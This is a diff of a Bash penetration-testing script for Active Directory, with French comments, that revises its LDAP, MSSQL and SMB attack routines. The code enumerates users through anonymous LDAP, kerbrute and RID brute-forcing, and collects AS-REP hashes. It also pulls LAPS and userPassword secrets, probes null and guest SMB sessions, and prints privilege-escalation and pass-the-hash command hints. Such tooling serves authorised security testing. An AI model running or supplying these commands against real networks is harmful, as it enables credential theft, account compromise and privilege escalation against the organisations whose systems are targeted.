-					$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" "objectclass=user" sAMAccountName | grep "sAMAccountName" | awk -F ": " '{print $2}'| grep -v "sAMAccountName" > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
+					#Extraction des utilisateurs et groupes (CN) : Peu précis ..
+					$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" | grep 'dn: CN=' > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
 					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
-
-					if [[ "$check_ldap" -gt 0 ]]; then
-						green_log "${SPACE}${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
-					fi
 					
-					#Retrieving the users account via kerbrute and trying to get no-preauth users
-					$proxychains kerbrute userenum --dc $DC_Name -d $LDAP_domain ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt -t 50 --downgrade --hash-file ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt > ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt 2>/dev/null
-					check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'krb5asrep' | wc -l)
 					if [[ "$check_ldap" -gt 0 ]]; then
-						green_log "${SPACE}${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
+						green_log "${SPACE}${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
+						
+						#Aller plus loin en tentant d'extraire les noms d'utilisateurs :
+						$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" "objectclass=user" sAMAccountName | grep "sAMAccountName" | awk -F ": " '{print $2}'| grep -v "sAMAccountName" > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
+						check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
+
+						if [[ "$check_ldap" -gt 0 ]]; then
+							green_log "${SPACE}${SPACE}[💀] Users extracted -> ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt"
+						fi
+						
+						#Retrieving the users account via kerbrute and trying to get no-preauth users
+						$proxychains kerbrute userenum --dc $DC_Name -d $LDAP_domain ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt -t 50 --downgrade --hash-file ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt > ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt 2>/dev/null
+						check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'krb5asrep' | wc -l)
+						if [[ "$check_ldap" -gt 0 ]]; then
+							green_log "${SPACE}${SPACE}[💀] Users without pre-auth found ! -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users_no_preauth.txt"
+						fi
+						cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'VALID' | awk -F "[:@]" '{print $4}'| sed 's/^[ \t]*//;s/[ \t]*$//' >> ${DIR}/users.txt
+						sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 					fi
-					cat ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}_valid_users.txt | grep 'VALID' | awk -F "[:@]" '{print $4}'| sed 's/^[ \t]*//;s/[ \t]*$//' >> ${DIR}/users.txt
-					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 				fi
-			fi
+			fi	
 		done
 		
 		rm ${DIR}/IP_FQDN_ldap.txt
@@ -831,32 +997,34 @@ ldap () {
 		log "[🔍] Enumeration via LDAP"
 		for module in ${ldap_modules[@]};do
 			echo $LDAP_Servers | while read ip;do
-				host=${ip}
-				$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
-				if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then 
-					#If NTLM isn't supported, then use kerberos authentification
-					hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-					if [[ -n "$hostname" ]];then
-						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
-					else
-						host="$ip"
+				if control_ip_attack; then
+					host=${ip}
+					$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
+					if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then 
+						#If NTLM isn't supported, then use kerberos authentification
+						hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+						if [[ -n "$hostname" ]];then
+							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+							host="$(echo $hostname | cut -d '.' -f 1)"
+						else
+							host="$ip"
+						fi
+						if [[ -n "$hostname" ]];then
+							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+							host="$(echo $hostname | cut -d '.' -f 1)"
+						fi
+						$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
 					fi
-					if [[ -n "$hostname" ]];then
-						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
+					if [[ "$module" == "laps" ]] && grep -Eqio "Password:" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
+						green_log "${SPACE}[💀] '$module' password(s) found from ${username} account ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
+					elif [[ "$module" == "adcs" ]] && grep -Eqio "FOUND PKI|Found CN" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
+						green_log "${SPACE}[💀] '$module' server found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
+					elif [[ "$module" == "get-userPassword" ]] && grep -Eqio "GET-USER" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No userPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
+						green_log "${SPACE}[💀] Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
+					elif [[ "$module" == "get-unixUserPassword" ]] && grep -Eqio "GET-UNIX" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No unixUserPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
+						green_log "${SPACE}[💀] Unix Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
 					fi
-					$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
-				fi
-				if [[ "$module" == "laps" ]] && grep -Eqio "Password:" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
-					green_log "${SPACE}[💀] '$module' password(s) found from ${username} account ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
-				elif [[ "$module" == "adcs" ]] && grep -Eqio "FOUND PKI|Found CN" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
-					green_log "${SPACE}[💀] '$module' server found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
-				elif [[ "$module" == "get-userPassword" ]] && grep -Eqio "GET-USER" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No userPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
-					green_log "${SPACE}[💀] Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
-				elif [[ "$module" == "get-unixUserPassword" ]] && grep -Eqio "GET-UNIX" $DIR_VULNS/Enum_Device_${ip}_$module.txt && ! grep -Eqio "No unixUserPassword Found" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
-					green_log "${SPACE}[💀] Unix Users Password found ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
-				fi
+				fi	
 			done 
 		done
 	fi
@@ -869,27 +1037,40 @@ ipmi () {
 }
 
 mssql () {
-	if [[ -e "${DIR_PORTS}/1443.txt" ]] && [[ "$Username" != "anonymous" ]]; then
+	if [[ -e "${DIR_PORTS}/1433.txt" ]] && [[ "$Username" != "anonymous" ]]; then
 	mkdir ${DIR_VULNS}/mssql
-		log "[🔍] MSSQL check"
-		MSSQL=$(cat ${DIR_PORTS}/1443.txt)
+		log "[🔍] Checking MSSQL"
+		MSSQL=$(cat ${DIR_PORTS}/1433.txt)
 		for ip in $MSSQL; do
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			$proxychains netexec --timeout $CME_TIMEOUT mssql $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
-			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
-				#If NTLM is not supported, restart with kerberos
-				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-				if [[ -n "$hostname" ]];then
-					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-					host="$(echo $hostname | cut -d '.' -f 1)"
+			if control_ip_attack; then
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
+				$proxychains netexec --timeout $CME_TIMEOUT mssql $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
+				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
+					#If NTLM is not supported, restart with kerberos
+					hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+					if [[ -n "$hostname" ]];then
+						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+						host="$(echo $hostname | cut -d '.' -f 1)"
+					else
+						kerberos=""
+						host="${ip}"
+					fi
+					$proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
 				fi
-				$proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
-			fi
-			if grep -aq '\[+\]' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
-				green_log "${SPACE}${SPACE}[💀] $Username is a valid username ${ip} (${hostname})"
-			fi
-			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
-				red_log "${SPACE}${SPACE}[💀] $Username have admin rights on MSSQL DB ${ip} (${hostname}) !"
+				# is user ?
+				if grep -aq '\[+\]' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
+					green_log "${SPACE}${SPACE}[💀] $Username is a valid username ${ip} (${hostname})"
+					# is admin ?
+					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
+						red_log "${SPACE}${SPACE}[💀] $Username have admin rights on MSSQL DB ${ip} (${hostname}) !"
+					fi
+					#Can impersonate ? https://seguridadpy.info/2024/08/mssql-for-pentester-netexec/
+					$proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos -M mssql_priv < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_mssql_priv 2>/dev/null
+					if grep -aq 'can impersonate' ${DIR_VULNS}/mssql/cme_${ip}_mssql_priv; then
+						red_log "${SPACE}${SPACE}[💀] $Username can impersonate user on MSSQL DB ${ip} (${hostname}) !"
+						blue_log "${SPACE}${SPACE} [+] $proxychains netexec mssql $host -u "$Username" $cme_creds $kerberos -M mssql_priv -o ACTION=privesc  / 'rollback' to reverse the impersonation"
+					fi
+				fi
 			fi
 		done
 	fi
@@ -899,290 +1080,290 @@ mssql () {
 smb () {
 	if [[ -e "${DIR_PORTS}/445.txt" ]]; then
 		mkdir ${DIR_VULNS}/smb
-		log "[🔍] SMB check"
+		log "[🔍] Check SMB"
 		SMB=$(cat ${DIR_PORTS}/445.txt)
 		for ip in $SMB;	do
-			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
+			if control_ip_attack; then
+				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
 
-			#Anonymous / null session is allowed ?
-			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 1000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session 2>/dev/null
-			if grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
-				green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
-				## Injecter ces utilisateurs dans un fichier
-				
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
-						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
-						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
-				## Supprimer les doublons
-				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
-				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
-						awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
-				if [[ "$check_smb" -gt 0 ]]; then
-					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
-				fi
-				$proxychains timeout 7 smbmap -H $ip --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\." > ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares 2>/dev/null
-				if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-					green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_null_session_shares"
-					blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
-				fi
-			fi
-			# Guest session allowed ?
-			$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest 2>/dev/null
-			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest; then
-				green_log "${SPACE}${SPACE}[💀] Guest session allowed"
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
-						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
-						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
-				
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
-				
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
-						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
-						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
-						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
-				
-				## Supprimer les doublons
-				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
-				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
-						awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
-				if [[ "$check_smb" -gt 0 ]]; then
-					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
-				fi
-				$proxychains timeout 7 smbmap -H $ip -p 'GuestUser' -p '' --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\." > ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares 2>/dev/null
-				if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"; then
-					green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_guest_users_shares"
-					blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -p 'GuestUser' -p '' -r --depth 3 --exclude IPC$"
-				fi
-			fi
-			# Can i connect with input user ?
-			if [[ "$Username" != "anonymous" ]]; then
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
-				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username"; then
-					#If NTLM is not supported, restart with kerberos
-					if [[ -n "$hostname" ]];then
-						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
-					fi
-					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
-				else
-					kerberos=""
-					host="${ip}"
-				fi
-			fi
-			#Can we connect to at least one share ?
-			if grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username || grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aqs 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
-				if [[ "$Username" != "anonymous" ]]; then
-					green_log "${SPACE}${SPACE}[💀] $Username is a valid username"
-				fi
-				can_connect="1"
-			else
-				can_connect="0"
-			fi
-			#Are we machine's admin
-			if grep -aqs '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username; then
-				red_log "${SPACE}${SPACE}[💀] $Username have admin rights ! -> impacket-smbexec to exploit"
-				admin="1"
-			else
-				admin="0"
-			fi
-			
-			if [ "$can_connect" = "1" ]; then
-				#List available shares
-				if [ "$Username" = "anonymous" ]; then
-					$proxychains timeout 7 smbmap -H $ip --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\."  > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
-					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
-						blue_log "${SPACE}${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$ --no-banner"
-					fi
-				else
-					$proxychains timeout 7 smbmap -H $ip -u "$Username" $cme_creds --no-banner | grep -vE "Enumerating shares\.\.\.|Authenticating\.\.\.|Checking for open ports\.\.\.|Closing connections\.\." > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
-					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
-						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
-						if [ -n "$NT_Hash" ]; then
-							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
-						else
-							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
+				#Anonymous / null session is allowed ?
+				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
+				if grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
+					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
+						green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
+						if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
+							green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
+							blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
 						fi
 					fi
-				fi
-				
-				
-				###### RETRIEVE POLICY PASSWORD ######
-				$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --pass-pol < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_pass_pol 2>/dev/null
-				check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_pass_pol | wc -l)
-				if [ "$check_smb" -gt 1 ]; then
-					green_log "${SPACE}${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
-				fi
-				
-				###### RETRIEVE USERS ######
-					#'< /dev/null' avoid netexec to break the loop, weird behavior ..
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip $cme_creds $kerberos --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
-				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
-				if grep -qs "SidTypeUser" "$check_smb"; then
-					green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
-					## Supprimer les doublons
-					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
-				fi
-				
-				$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_users 2>/dev/null
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_users | wc -l)
-				if [[ "$check_smb" -gt 4 ]]; then
-					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
-								
+					
+					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
+					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
 					## Injecter ces utilisateurs dans un fichier
-					cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+					
+					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
 							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
 							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
 							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
-					cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
-							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
 					## Supprimer les doublons
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
+					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
+							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
+					if [[ "$check_smb" -gt 0 ]]; then
+						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
+					fi
+				fi
+				# Guest session allowed ?
+				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_shares 2>/dev/null
+				if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest_shares; then
+					green_log "${SPACE}${SPACE}[💀] Guest session allowed"
+					
+					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_guest_shares"; then
+						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_guest_shares"
+						blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -p 'GuestUser' -p '' -r --depth 3 --exclude IPC$"
+					fi
+					
+					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
